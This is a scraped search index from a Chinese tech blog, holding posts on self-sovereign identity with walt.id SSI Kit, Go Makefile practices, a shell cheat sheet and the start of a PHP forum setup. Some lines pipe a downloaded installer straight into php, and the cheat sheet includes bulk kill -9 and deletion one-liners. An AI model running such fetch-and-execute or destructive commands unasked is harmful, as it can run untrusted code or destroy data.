\u0026#34;id111\u0026#34; }, \u0026#34;credentialStatus\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;https://essif.europa.eu/status/identity#verifiableID#1dee355d-0432-4910-ac9c-70d89e8d674e\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;CredentialStatusList2020\u0026#34; }, \u0026#34;credentialSchema\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;https://essif.europa.eu/tsr-vid/verifiableid1.json\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;JsonSchemaValidator2018\u0026#34; }, \u0026#34;evidence\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;https://essif.europa.eu/tsr-va/evidence/f2aeec97-fc0d-42bf-8ca7-0548192d5678\u0026#34;, \u0026#34;type\u0026#34;: [\u0026#34;DocumentVerification\u0026#34;], \u0026#34;verifier\u0026#34;: \u0026#34;did:ebsi:2962fb784df61baa267c8132497539f8c674b37c1244a7a\u0026#34;, \u0026#34;evidenceDocument\u0026#34;: \u0026#34;Passport\u0026#34;, \u0026#34;subjectPresence\u0026#34;: \u0026#34;Physical\u0026#34;, \u0026#34;documentPresence\u0026#34;: \u0026#34;Physical\u0026#34; } ], \u0026#34;proof\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;EidasSeal2021\u0026#34;, \u0026#34;created\u0026#34;: \u0026#34;2019-06-22T14:11:44Z\u0026#34;, \u0026#34;proofPurpose\u0026#34;: \u0026#34;assertionMethod\u0026#34;, \u0026#34;verificationMethod\u0026#34;: \u0026#34;did:ebsi:2757945549477fc571663bee12042873fe555b674bd294a3#2368332668\u0026#34;, \u0026#34;jws\u0026#34;: \u0026#34;HG21J4fdlnBvBA+y6D...amP7O=\u0026#34; } } Verifiable Presentations (VPs) # VP 则由 Holders 创建和签名，包含了来自一个或多个 VC 的身份信息，用于出示给 Verifier。VP 通常至少包含\nVC 或者 VC 的一部分（例如部分个人属性） 接收者（Holders）的签名 一个典型的 VP 长这样：\n{ \u0026#34;@context\u0026#34;: [\u0026#34;https://www.w3.org/2018/credentials/v1\u0026#34;], \u0026#34;type\u0026#34;: [\u0026#34;VerifiableCredential\u0026#34;, \u0026#34;VerifiablePresentation\u0026#34;], \u0026#34;verifiableCredential\u0026#34;: [ { \u0026#34;@context\u0026#34;: [ \u0026#34;https://www.w3.org/2018/credentials/v1\u0026#34;, \u0026#34;https://essif.europa.eu/schemas/vc/2020/v1\u0026#34; ], \u0026#34;credentialSubject\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;did:ebsi:00000004321\u0026#34;, \u0026#34;naturalPerson\u0026#34;: { \u0026#34;did\u0026#34;: \u0026#34;did:example:00001111\u0026#34; } }, \u0026#34;id\u0026#34;: \u0026#34;did:ebsi-eth:00000001/credentials/1872\u0026#34;, \u0026#34;issuanceDate\u0026#34;: \u0026#34;2020-08-24T14:13:44Z\u0026#34;, \u0026#34;issuer\u0026#34;: \u0026#34;did:ebsi:000001234\u0026#34;, \u0026#34;proof\u0026#34;: { \u0026#34;created\u0026#34;: \u0026#34;2020-08-24T14:13:44Z\u0026#34;, \u0026#34;jws\u0026#34;: \u0026#34;eyJhbGciOiJSUzI1NiIsImI2NCI6ZmFsc2UsImNyaXQiOlsiYjY0Il19.\u0026#34;, \u0026#34;proofPurpose\u0026#34;: \u0026#34;assertionMethod\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;EcdsaSecp256k1Signature2019\u0026#34;, \u0026#34;verificationMethod\u0026#34;: \u0026#34;did:ebsi-eth:000001234#key-1\u0026#34; }, \u0026#34;type\u0026#34;: [\u0026#34;VerifiableCredential\u0026#34;, \u0026#34;VerifiableAuthorization\u0026#34;] }, { \u0026#34;@context\u0026#34;: [ \u0026#34;https://www.w3.org/2018/credentials/v1\u0026#34;, \u0026#34;https://w3id.org/citizenship/v1\u0026#34; ], \u0026#34;credentialSubject\u0026#34;: { \u0026#34;birthDate\u0026#34;: \u0026#34;1958-08-17\u0026#34;, \u0026#34;givenName\u0026#34;: \u0026#34;JOHN\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;did:example:123\u0026#34;, \u0026#34;type\u0026#34;: [\u0026#34;PermanentResident\u0026#34;, \u0026#34;Person\u0026#34;] }, \u0026#34;issuer\u0026#34;: \u0026#34;did:example:456\u0026#34;, \u0026#34;proof\u0026#34;: { \u0026#34;created\u0026#34;: \u0026#34;2020-04-22T10:37:22Z\u0026#34;, \u0026#34;jws\u0026#34;: \u0026#34;eyJjcml0IjpbImI2NCJdLCJiNjQiOmZhbHNlLCJhbGciOiJFZERTQSJ9..BhWew0x-txcroGjgdtK-yBCqoetg9DD9SgV4245TmXJi-PmqFzux6Cwaph0r-mbqzlE17yLebjfqbRT275U1AA\u0026#34;, \u0026#34;proofPurpose\u0026#34;: \u0026#34;assertionMethod\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;Ed25519Signature2018\u0026#34;, \u0026#34;verificationMethod\u0026#34;: \u0026#34;did:example:456#key-1\u0026#34; }, \u0026#34;type\u0026#34;: [\u0026#34;VerifiableCredential\u0026#34;, \u0026#34;PermanentResidentCard\u0026#34;] } ] } Protocols # VC 和 VP 的传输需要一个安全的协议，通常参与者间的通信建立在双向认证的加密信道上。最常用的 SSI 数据交换协议包括：\nOIDC4SSI / SIOP：认证授权协议 OpenID Connect 的扩展 DIDComm：Decentralized Identity Foundation（DIF）专为 SSI 设计的新协议 Credential Handler API：将用户的身份信息连接到 web 应用的浏览器扩展 技术实践 # 以 walt.id 的 SSI Kit 为例，首先构建 SSI Kit（需要 JDK 16+，并会安装 Gradle 7）：\n$ ./ssikit.sh build $ alias ssikit=./ssikit.sh 或直接使用 docker 镜像：\n$ alias ssikit=docker run -itv $(pwd)/data:/app/data waltid/ssikit 接下来，以较复杂的与 EBSI/ESSIF 生态结合的完整流程为例，这里需要使用 did:ebsi 并遵循 ESSIF Onboarding -\u0026gt; EBSI Auth API -\u0026gt; ESSIF DID Registration 工作流。而相对简单的 did:key 和 did:web 的流程类似，且步骤更少。\n1. Issuer # 首先生成密钥，注意 did:ebsi 要求使用 ECDSA Secp256k1 密钥 ：\n$ ssikit key gen -a Secp256k1 # f99c22970c5a430e85bf55120918acfa 使用密钥生成 DID：\n$ ssikit did create -m ebsi -k f99c22970c5a430e85bf55120918acfa # did:ebsi:z25xkb9bFMYnCp4rGegG7a3E $ ISSUER_DID=did:ebsi:z25xkb9bFMYnCp4rGegG7a3E 将从 https://app.preprod.ebsi.eu/users-onboarding 获得的 token 贴到 issuer/data/bearer-token.txt 中，随后注册 Issuer 的 DID 到 EBSI ledger 上：\n$ ssikit essif onboard --did $ISSUER_DID issuer/data/bearer-token.txt $ ssikit essif auth-api --did $ISSUER_DID $ ssikit essif did register --did $ISSUER_DID 验证是否能从 EBSI ledger 上获取并解析 DID：\n$ ssikit did resolve --did $ISSUER_DID 2. Holder # 与 Issuer 类似：\n$ ssikit key gen -a Secp256k1 # aa7c8338bd284ed0ab0db613c8656425 $ ssikit did create -m ebsi -k aa7c8338bd284ed0ab0db613c8656425 # did:ebsi:zn8bsd3Q51ZzjmHzb41BcQp $ HOLDER_DID=did:ebsi:zn8bsd3Q51ZzjmHzb41BcQp $ ssikit essif onboard --did $HOLDER_DID holder/data/bearer-token.txt $ ssikit essif auth-api --did $HOLDER_DID $ ssikit essif did register --did $HOLDER_DID $ ssikit did resolve --did $HOLDER_DID 3. Issuer # 用学位证明模版 VerifiableDiploma 签发两个证明（VC）：\n$ ssikit vc issue -i $ISSUER_DID -s $HOLDER_DID -t VerifiableDiploma --interactive issuer/data/bachelor.json $ ssikit vc issue -i $ISSUER_DID -s $HOLDER_DID -t VerifiableDiploma --interactive issuer/data/master.json 发送给 Holder：\n$ cp issuer/data/*.json holder/data 注意这里使用 cp 来模拟发送操作，实际应用中往往需要额外的 Data Exchange Protocols 来安全传输 VC 和 VP。\n4. Holder # 用两个 VC 生成 VP：\n$ ssikit vc present --holder-did $HOLDER_DID holder/data/bachelor.json holder/data/master.json 发送给 Verifier：\n$ cp data/vc/presented/vp-1657865675707.json verifier/data 5. Verifier # 验证 VC 和 VP，这里需要验证：\nIssuer 和 Holder 的 DID（从 EBSI ledger 获取） VP 中每个 VC 的签名 VP 自身的签名 $ ssikit vc verify -p TrustedIssuerDidPolicy -p TrustedSubjectDidPolicy -p JsonSchemaPolicy -p SignaturePolicy verifier/data/vp-1657865675707.json 需要注意的是，-p 参数设置的验证规则顺序很重要。在上述命令中，Verifier 会先检查 Issuer 和 Holder 的 DID，只有验证通过后两者的公钥才会被导入，随后才能用 SignaturePolicy 检查签名。\n使用场景 # SSI 技术在身份认证相关领域有着广泛的用途，例如：\nIAM，可替代注册-登录流程，用于认证已知的用户和参与者 身份证明与验证，和 IAM 相对，用于认证未知的用户和参与者 风险与合规性检查，即检查身份信息以外的其他背景信息 数字身份，可替代传统的纸质身份文件/证件，更容易管理、分享和验证且更难伪造 关联身份的钱包应用 参考资料 # SSI | Basics Technologies \u0026amp; Concepts Decentralized Identifiers (DIDs) v1.0 Verifiable Credentials Data Model v1.1 Build end-to-end use cases Use cases ","date":"2022-07-02","permalink":"/posts/ssi/","section":"Posts","summary":"\u003cp\u003e更安全方便地管理、分享和验证身份信息。\u003c/p\u003e","title":"自主身份：SSI 技术实践"},{"content":"","date":"2022-06-22","permalink":"/tags/go/","section":"Tags","summary":"","title":"Go"},{"content":"","date":"2022-06-22","permalink":"/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/","section":"Categories","summary":"","title":"编程语言"},{"content":"用古老的工具构建现代化的应用。\nMakefile 功能强大但语法复杂，而且通常会和语法同样令人困惑的 Shell 脚本混用，在编写 Makefile 进行项目管理时很容易写出一团乱麻。因此记录了一些目前收集到的编写可维护、可拓展 Makefile 的技巧和实践。\n基础规则 # targets: prerequisites ｜ order-only-prerequisites commands 这表示构建 targets 需要先满足 prerequisites，因此如果 prerequisites 如果未满足/未被构建，则会先尝试构建 prerequisites，满足后才会执行 commands 来构建 targets。order-only-prerequisites 则只有在第一次构建 targets 时才会被构建。\n在 Go 项目中，我们通常不直接通过 Makefile 的 targets 构建目标文件，而是利用上述语法容易建立依赖关系的特性进行项目管理。因此通常会使用 .PHONY 来表示需要构建一个伪目标而非实际的目标文件：\n.PHONY: targets targets: prerequisites commands 例如，我们希望运行 make clean 清除所有生成的文件：\n.PHONY: clean clean: @echo \u0026#34;Cleaning all build output\u0026#34; @-rm -vrf $(OUTPUT_DIR) 这里用 @ 开头避免输出命令本身，-rm 防止在没有目标目录的情况下报错中止。$(OUTPUT_DIR) 引用 Makefile 中定义的变量，通常通过 OUTPUT_DIR=/path/to/_output 的形式定义。同时也存在一些预定义的变量，例如 $(MAKE) 就指向 make 的二进制文件。\n变量定义根据这里等号的不同，赋值方式也有所不同：\n= 直接赋值，但引用变量的值会在使用时才计算 := 直接赋值，引用变量的值在赋值时计算，比较类似常规编程语言的用法 ?= 如果变量没有值才会赋值，在用户自定义配置时很常用 += 在后面追加赋值，同样类似常规编程语言的 += 需要注意，Makefile 中定义的变量只在当前 Makefile 有效，若要暴露给其他 Makefile 则需要 export 出来。\n常见管理内容 # 在 Go 项目中，我们一般用 Makefile 来帮助自动化如下流程：\n静态代码检查（lint）、格式化代码（format） 单元测试（test）、计算覆盖率（cover） 编译（build）、多平台编译（build.multiarch） 镜像构建（image）、镜像发布（push） 清理生成的文件（clean） 安装依赖的工具（tools） 代码/文档生成（gen） 部署（deploy） 发布（release） 打 Linux 平台包（package） 添加 license（add-license）、检查 license（verify-license） 关于本 Makefile 如何使用的帮助（help） 常用函数 # 作为 Makefile 语法的一部分，函数能实现许多巧妙的操作，我们会在后文看到这一点。\n函数名 功能描述 $(origin \u0026lt;variable\u0026gt;) 返回变量状态： undefined-未定义; default-默认的定义; environment-环境变量; file-被定义在 Makefile 中; command line-被命令行定义; override-被 override 定义; automatic-自动化变量 $(addsuffix \u0026lt;suffix\u0026gt;,\u0026lt;names...\u0026gt;) 把 \u0026lt;suffix\u0026gt; 加到 \u0026lt;names\u0026gt; 中的每个单词后面，并返回加过后缀的文件名序列 $(addprefix \u0026lt;prefix\u0026gt;,\u0026lt;names...\u0026gt;) 把 \u0026lt;prefix\u0026gt; 加到 \u0026lt;names\u0026gt; 中的每个单词前面，并返回加过前缀的文件名序列 $(wildcard \u0026lt;pattern\u0026gt;) 扩展通配符，例如 $(wildcard *.go) 能匹配所有 go 文件 $(word \u0026lt;n\u0026gt;,\u0026lt;text\u0026gt;) 返回 \u0026lt;text\u0026gt; 的第 \u0026lt;n\u0026gt; 个单词。如 \u0026lt;n\u0026gt; 比 \u0026lt;text\u0026gt; 中的单词数要大，返回空字符串 $(subst \u0026lt;from\u0026gt;,\u0026lt;to\u0026gt;,\u0026lt;text\u0026gt;) 把 \u0026lt;text\u0026gt; 中的 \u0026lt;from\u0026gt; 替换成 \u0026lt;to\u0026gt; 并返回 $(eval \u0026lt;text\u0026gt;) 将 \u0026lt;text\u0026gt; 的内容将作为 Makefile 的一部分而被 make 解析和执行 $(firstword \u0026lt;text\u0026gt;) 返回 \u0026lt;text\u0026gt; 的第一个单词 $(lastword \u0026lt;text\u0026gt;) 返回 \u0026lt;text\u0026gt; 的最后一个单词 $(abspath \u0026lt;text\u0026gt;) 将 \u0026lt;text\u0026gt; 中的路径转换成绝对路径并返回 $(shell cat foo) 执行操作系统命令，并返回操作结果 $(info \u0026lt;text ...\u0026gt;) 输出一段信息 $(warning \u0026lt;text ...\u0026gt;) 输出一段警告信息，但继续执行 $(error \u0026lt;text ...\u0026gt;) 输出一段错误信息，并停止执行 $(filter \u0026lt;pattern...\u0026gt;,\u0026lt;text\u0026gt;) 以 \u0026lt;pattern\u0026gt; 过滤 \u0026lt;text\u0026gt; 中的单词，返回符合 \u0026lt;pattern\u0026gt; 的单词 $(filter-out \u0026lt;pattern...\u0026gt;,\u0026lt;text\u0026gt;) 以 \u0026lt;pattern\u0026gt; 过滤 \u0026lt;text\u0026gt; 中的单词，返回不符合 \u0026lt;pattern\u0026gt; 的单词 $(dir \u0026lt;names...\u0026gt;) 从 \u0026lt;names\u0026gt; 中取出目录部分。目录部分是指最后一个 / 之前的部分。 $(notdir \u0026lt;names...\u0026gt;) 从 \u0026lt;names\u0026gt; 中取出非目录部分。 $(strip \u0026lt;text\u0026gt;) 去掉 \u0026lt;text\u0026gt; 中开头和结尾的空字符 $(suffix \u0026lt;names...\u0026gt;) 返回 \u0026lt;names\u0026gt; 中各个文件名的后缀。如果文件名没有后缀，则返回空字串 $(foreach \u0026lt;variable\u0026gt;,\u0026lt;list\u0026gt;,\u0026lt;text\u0026gt;) 把 \u0026lt;list\u0026gt; 中的单词逐一取出放到 \u0026lt;variable\u0026gt; 所指定的变量中，然后执行 \u0026lt;text\u0026gt;。每次 \u0026lt;text\u0026gt; 会返回一个字符串，返回循环结束后返回的字符串序列（以空格分隔）。 生成帮助信息 # 我们首先的是根据 Makefile 代码自动生成帮助信息，这一点可以参考 swagger，通过添加特殊注释的方式实现。以 clean 为例，我们可以在每一个伪目标前添加说明：\n## clean: Remove all files that are created by building. .PHONY: clean clean: @echo \u0026#34;Cleaning all build output\u0026#34; @-rm -vrf $(OUTPUT_DIR) 然后利用 sed 提取注释，并用 awk 或 column 来分列、着色显示：\n## help: Show this help info. .PHONY: help help: Makefile @echo -e \u0026#34;\\nUsage: make \u0026lt;TARGETS\u0026gt; \u0026lt;OPTIONS\u0026gt; ...\\n\\nTargets:\u0026#34; @sed -n \u0026#39;s/^##//p\u0026#39; $\u0026lt; | awk -F\u0026#39;:\u0026#39; \u0026#39;{printf \u0026#34;\\033[36m%-20s\\033[0m %s\\n\u0026#34;, $$1, $$2}\u0026#39; | sed -e \u0026#39;s/^/ /\u0026#39; @echo \u0026#34;$$USAGE_OPTIONS\u0026#34; 这里的 USAGE_OPTIONS 需要通过 define 定义（本质上是多行变量）并 export 到全局，随后就能全局通过 $$USAGE_OPTIONS 引用，其中可以添加一些支持用户自定义的配置说明。可以参考这个 USAGE_OPTIONS：\ndefine USAGE_OPTIONS Options: DEBUG Whether or not to generate debug symbols. Default is 0. CGO_ENABLED Whether or not to use CGO. Default is 0. BINS Binaries to build. Default is all binaries under cmd. This option is available when using: make build/compress(.multiarch) Example: make build BINS=\u0026#34;server client\u0026#34; PACKAGES Packages to build. Default is rpm and deb. This option is available when using: make package/package.multiarch Example: make package PACKAGES=\u0026#34;rpm deb\u0026#34; PLATFORMS Platforms to build for. Default is linux_amd64 and linux_arm64. This option is available when using: make *.multiarch Example: make build.multiarch PLATFORMS=\u0026#34;linux_amd64 linux_arm64\u0026#34; V Set to 1 enable verbose build. Default is 0. endef export USAGE_OPTIONS 随后，我们就可以根据用户定义的配置来更改 make 的行为：\n# verbose settings ifndef V MAKEFLAGS += --no-print-directory endif 目录结构 # 实际项目中，为了便于维护，我们可以拆分 Makefile 为若干个更小的 .mk 文件，并根据项目目录结构将这些文件放入合适的目录。一个可以参考的结构如下：\nMakefile scripts ├── make-rules │ ├── common.mk │ ├── golang.mk │ ├── ... 随后只需要在 Makefile 中 include 相应文件即可：\ninclude scripts/make-rules/common.mk include scripts/make-rules/golang.mk include ... 对应目录结构，我们可以用类似的方式命名伪目标。例如 scripts/make-rules/golang.mk 一律以 go. 开头来命名，如 go.build、go.lint、go.test 等；如果需要进一步细分伪目标，只需要加一个层级，如 go.build.linux_amd64、go.build.linux_arm64 等。\n设计依赖关系 # 🌰 灵活编译 # 假设我们在项目中既需要编译多个平台的多个二进制文件用于发布、又需要编译单一平台的多个二进制文件用于测试，考虑到可扩展性，我们期望能设计出这样的命令，例如 make build 和 make build.multiarch，能灵活地编译出我们想要的二进制文件。\n因此，我们自底向上设计命令间的依赖关系，在 scripts/make-rules/golang.mk 中编写编译指令。最底层的命令应形如 go.build.[PLATFORM].[COMMAND] 形式，例如 go.build.linux_amd64.server。为了避免冗余，可以结合使用通配符和自动变量：\n.PHONY: go.build.% go.build.%: $(eval COMMAND := $(word 2,$(subst ., ,$*))) $(eval PLATFORM := $(word 1,$(subst ., ,$*))) $(eval OS := $(word 1,$(subst _, ,$(PLATFORM)))) $(eval ARCH := $(word 2,$(subst _, ,$(PLATFORM)))) @echo \u0026#34;Building binary $(COMMAND) for $(PLATFORM)\u0026#34; @mkdir -p $(BIN_DIR)/$(PLATFORM) CGO_ENABLED=$(CGO_ENABLED) GOOS=$(OS) GOARCH=$(ARCH) $(GO) build $(GO_BUILD_FLAGS) -o $(BIN_DIR)/$(PLATFORM)/$(COMMAND) $(ROOT_PACKAGE)/cmd/$(COMMAND) 注意在 targets 内部会执行 shell 命令，不能直接执行 Makefile 变量赋值，因此可以利用 eval 函数。此外还使用了 word 和 subst 函数来提取 PLATFORM 和 COMMAND 信息，自动变量 $* 指的就是 % 所匹配到的字符串。这样一来，我们就可以用 go.build.[PLATFORM].[COMMAND] 形式来编译任意平台的任意二进制文件了。\n不妨假设这里的二进制文件包括 cmd/server 和 cmd/client，如何指定要编译的二进制文件呢？我们通过读取 cmd 目录下的目录名称来获得所有二进制文件的名称，赋值给 BINS 变量：\nCOMMANDS ?= $(filter-out %.md, $(wildcard ${ROOT_DIR}/cmd/*)) BINS ?= $(foreach cmd,${COMMANDS},$(notdir ${cmd})) 随后利用底层 go.build.% 的能力，借助 $(addprefix ...) 函数拼接出要构建的 targets 名，作为 go.build 的依赖。同样作为依赖的还有 go.build.verify，确保安装了 go、或者是确保安装的 go 版本符合要求。\n.PHONY: go.build.verify go.build.verify: ifneq ($(shell $(GO) version | grep -q \u0026#39;go version go\u0026#39; \u0026amp;\u0026amp; echo 0 || echo 1), 0) $(error Go binary is not found. Please install Go first.\u0026#39;) endif .PHONY: go.build go.build: go.build.verify $(addprefix go.build., $(addprefix $(PLATFORM)., $(BINS))) 这样就会编译所有二进制文件。然后只需要在 USAGE_OPTIONS 中让用户能够覆盖 BINS 的值，即可指定要编译哪些二进制文件，所以上面 BINS 的赋值用了 ?=。在多个平台上编译也类似：\n.PHONY: go.build.multiarch go.build.multiarch: go.build.verify $(foreach p,$(PLATFORMS),$(addprefix go.build., $(addprefix $(p)., $(BINS)))) 最后，我们将这两个命令暴露到根目录 Makefile，使得只要调用 make build 和 make build.multiarch 即可：\n## build: Build source code for host platform. .PHONY: build build: @$(MAKE) go.build ## build.multiarch: Build source code for multiple platforms. .PHONY: build.multiarch build.multiarch: @$(MAKE) go.build.multiarch 整个过程的调用链长这样：\nbuild.multiarch -\u0026gt; go.build.multiarch -\u0026gt; go.build.verify -\u0026gt; go.build.linux_amd64.server -\u0026gt; go.build.linux_amd64.client -\u0026gt; go.build.linux_arm64.server -\u0026gt; go.build.linux_arm64.client 🌰 自动安装依赖工具 # 我们同样可以利用 Makefile 依赖关系来自动安装依赖工具、避免重复安装工具等。以检查 license 为例，这一操作需要安装 addlicense 工具。我们首先在 scripts/make-rules/license.mk 中，让 license.verify 依赖于 tools.verify.addlicense：\n.PHONY: license.verify license.verify: tools.verify.addlicense @echo \u0026#34;Verifying the boilerplate headers for all files\u0026#34; @addlicense -check -f $(TEMPLATE) $(CODE_DIRS) 后者位于 scripts/make-rules/tools.mk 中，会检查工具是否已安装，如果没有则自动安装：\n.PHONY: tools.verify.% tools.verify.%: @if ! which $* \u0026amp;\u0026gt;/dev/null; then $(MAKE) tools.install.$*; fi .PHONY: tools.install.% tools.install.%: @echo \u0026#34;Installing $*\u0026#34; @$(MAKE) install.$* 最后调用针对每个工具的 install.% 安装工具：\n.PHONY: install.addlicense install.addlicense: @$(GO) install github.com/google/addlicense@latest 安装完后，第二次调用 tools.verify.addlicense 就会直接返回，不会重复安装工具。\n考虑到 verify-license 也是常用功能，我们也可以将其暴露到根目录 Makefile 中。这不是必须的，调用 make license.verify 效果相同。\n## verify-license: Verify the license headers for all files. .PHONY: verify-license verify-license: @$(MAKE) license.verify 其他常用设置 # scripts/make-rules/common.mk：\nSHELL := /bin/bash # include the common makefile COMMON_SELF_DIR := $(dir $(lastword $(MAKEFILE_LIST))) ifeq ($(origin ROOT_DIR),undefined) ROOT_DIR := $(abspath $(shell cd $(COMMON_SELF_DIR)/../.. \u0026amp;\u0026amp; pwd -P)) endif # Linux command settings CODE_DIRS := $(ROOT_DIR)/pkg $(ROOT_DIR)/cmd $(ROOT_DIR)/test FIND := find $(CODE_DIRS) scripts/make-rules/gen.mk：\n.PHONY: gen.clean gen.clean: @$(FIND) -type f -name \u0026#39;*_generated.go\u0026#39; -delete scripts/make-rules/golang.mk：\n.PHONY: go.lint go.lint: tools.verify.golangci-lint @echo \u0026#34;Run golangci to lint source codes\u0026#34; golangci-lint run -c $(ROOT_DIR)/.golangci.yml scripts/make-rules/tools.mk：\nBUILD_TOOLS ?= golangci-lint goimports addlicense # ... RELEASE_TOOLS ?= goreleaser upx nfpm # ... .PHONY: tools.install tools.install: $(addprefix tools.install., $(BUILD_TOOLS) $(RELEASE_TOOLS)) 参考资料 # Makefile Tutorial By Example 跟我一起写 Makefile ","date":"2022-06-22","permalink":"/posts/go-makefile/","section":"Posts","summary":"\u003cp\u003e用古老的工具构建现代化的应用。\u003c/p\u003e","title":"步步为营：在 Go 项目中编写 Makefile"},{"content":"记录一些之前不太了解的 Shell 的用法。\n常用快捷键 # Ctrl+A 回到本行起始位置 Ctrl+U 清空本行 Ctrl+L 清屏并回到顶部 引号 # \u0026quot; 字符串会替换变量值，而 ' 字符串不会：\n$ foo=bar $ echo \u0026#34;$foo\u0026#34; # bar $ echo \u0026#39;$foo\u0026#39; # $foo 特殊变量 # $0 - 脚本名 $1 到 $9 - 脚本的参数， $1 是第一个参数，依此类推 $@ - 所有参数 $# - 参数个数 $? - 上一个命令的返回值 $$ - 当前进程 PID !! - 完整的上一条命令（含参数） 常见应用：当因权限不足而执行命令失败时，可以使用 sudo !! 再尝试一次 $_ - 上一条命令的最后一个参数 交互式 shell 中也可以通过按下 Esc 之后键入 . 来获取这个值 通配符 # ? 只匹配单个字符，如 foo? 可以匹配 foo1，但不能匹配 foo42 image.{jpg,png} 扩展为 image.jpg image.png touch {foo,bar}/{a..j} 扩展为 foo/a foo/b ... foo/j bar/a bar/b ... bar/j Shebang # #!/bin/bash 使用 bash 执行脚本 #!/usr/local/bin/python 使用 python 执行脚本，可以 ./script.py 推荐在 shebang 中使用 env 来解析环境变量，如 #!/usr/bin/env python source script.sh 在当前 shell 进程中生效，./script.sh 则启动新进程 重定向 # \u0026lt;(CMD) 会执行 CMD 并将结果输出到一个临时文件中，并用文件名替换 \u0026lt;(CMD) 本身 例如 diff \u0026lt;(ls foo) \u0026lt;(ls bar) 可以对比两个目录的区别 \u0026gt; 标准输出重定向（1\u0026gt;），2\u0026gt; 标准错误输出重定向，\u0026amp;\u0026gt; 标准输出和标准错误输出重定向 nohup [cmd] \u0026gt;logs 2\u0026gt;\u0026amp;1 \u0026amp; 例：有如下脚本，需要一直运行直到出错并记录运行次数、输出日志：\n#!/usr/bin/env bash n=$(( RANDOM % 100 )) if [[ n -eq 42 ]]; then echo \u0026#34;Something went wrong\u0026#34; \u0026gt;\u0026amp;2 echo \u0026#34;The error was using magic numbers\u0026#34; exit 1 fi echo \u0026#34;Everything went according to plan\u0026#34; 解答：\n#!/usr/bin/env bash cnt=1 while true do ./script.sh 2\u0026gt; out.log if [[ $? -ne 0 ]]; then echo \u0026#34;failed after $cnt times\u0026#34; cat out.log break fi ((cnt++)) done 查找 # # 查找所有名称为 src 的目录 $ find . -name src -type d # 查找所有路径中包含 test 的 python 文件 $ find . -path \u0026#39;**/test/*.py\u0026#39; -type f # 查找前一天修改的所有文件 $ find . -mtime -1 # 查找所有大小在 500k 至 10M 的 tar.gz 文件 $ find . -size +500k -size -10M -name \u0026#39;*.tar.gz\u0026#39; # 删除全部扩展名为.tmp 的文件 $ find . -name \u0026#39;*.tmp\u0026#39; -exec rm {} \\; # 查找全部的 PNG 文件并将其转换为 JPG $ find . -name \u0026#39;*.png\u0026#39; -exec convert {} {}.jpg \\; # 查找命令历史中包含 find 的命令 $ history | grep find 此外，Ctrl+R 也可以直接查找命令历史。\n例：递归地查找文件夹中所有的 HTML 文件，并将它们压缩成 zip 文件。文件名中可能包含空格。\n$ mkdir html_root \u0026amp;\u0026amp; cd html_root $ touch {1..10}.html $ mkdir html $ touch \u0026#34;html/1 1.html\u0026#34; $ find . -type f -name \u0026#34;*.html\u0026#34; | xargs -d \u0026#39;\\n\u0026#39; tar -zcvf html.zip 数据处理 # 查看非法 SSH 登录：\n$ ssh server \u0026#39;journalctl | grep sshd | grep \u0026#34;Disconnected from\u0026#34;\u0026#39; \u0026gt; ssh.log $ less ssh.log 提取用户名：\n$ cat ssh.log | sed -E \u0026#39;s/.*Disconnected from (invalid |authenticating )?user (.*) [^ ]+ port [0-9]+( \\[preauth\\])?$/\\2/\u0026#39; 这一网站 可以在线测试正则表达式。\n去除重复的用户名，注意使用 uniq 去重前需要先确保相同的行是相邻的。这里可以用 sort 做到：\n$ cat ssh.log | sed -E \u0026#39;s/.*Disconnected from (invalid |authenticating )?user (.*) [^ ]+ port [0-9]+( \\[preauth\\])?$/\\2/\u0026#39; | sort | uniq -c 随后对第一列（-k1），也就是出现次数再按数字序（-n）降序（-r）排序，打印前 10 位：\n$ cat ssh.log | sed -E \u0026#39;s/.*Disconnected from (invalid |authenticating )?user (.*) [^ ]+ port [0-9]+( \\[preauth\\])?$/\\2/\u0026#39; | sort | uniq -c | sort -rnk1 | head -n10 只打印用户名：\n$ cat ssh.log | sed -E \u0026#39;s/.*Disconnected from (invalid |authenticating )?user (.*) [^ ]+ port [0-9]+( \\[preauth\\])?$/\\2/\u0026#39; | sort | uniq -c | sort -rnk1 | head -n10 | awk \u0026#39;{ print $2 }\u0026#39; awk 中，$0 表示整行内容，$1 到 $n 表示该行的第 n 个区域，分隔符通过 -F 指定，默认为空格。\n统计所有登录超过 1 次的登录次数之和：\n$ cat ssh.log | sed -E \u0026#39;s/.*Disconnected from (invalid |authenticating )?user (.*) [^ ]+ port [0-9]+( \\[preauth\\])?$/\\2/\u0026#39; | sort | uniq -c | awk \u0026#39;$1 != 1 { print $1 }\u0026#39; | paste -sd+ | bc -l 杀死指定进程：\n$ ps -ef | grep [key] | awk \u0026#39;{print $2}\u0026#39; | xargs kill -9 非预装工具 # 语法错误检查 shellcheck 简短帮助信息 tldr find 改良 fd grep 改良 ripgrep top 改良 htop 目录跳转 z 历史命令模糊查找 fzf 打印目录结构 tree 终端多路复用 tmux screen 压力测试 stress dotfiles 工具 ","date":"2022-04-30","permalink":"/posts/shell/","section":"Posts","summary":"\u003cp\u003e记录一些之前不太了解的 Shell 的用法。\u003c/p\u003e","title":"命令交互：Shell 备忘录"},{"content":"","date":"2022-03-13","permalink":"/tags/php/","section":"Tags","summary":"","title":"PHP"},{"content":"完全出于巧合和心血来潮搭建的一个论坛。\n准备 LAMP 环境 # 安装 PHP 7.4 # $ sudo apt update $ sudo apt install php-fpm php-mbstring php-curl php-dom php-gd php-json php-mysql php-zip php-tokenizer 安装 Composer # 更新：目前部署到了香港服务器上，可直接运行\n$ curl -sS https://getcomposer.org/installer | php 因为要部署在国内服务器上，可以使用国内的安装脚本镜像1：\n$ php -r \u0026#34;copy(\u0026#39;https://install.phpcomposer.com/installer\u0026#39;, \u0026#39;composer-setup.php\u0026#39;);\u0026#34; $ php composer-setup.php $ php -r \u0026#34;unlink(\u0026#39;composer-setup.php\u0026#39;);\u0026#34; 然后移动到环境变量包含的路径下：\n$ sudo mv composer.phar /usr/local/bin/composer 最后换源：\n$ composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ 安装 MariaDB 10.5.12 # $ sudo apt install mariadb-server 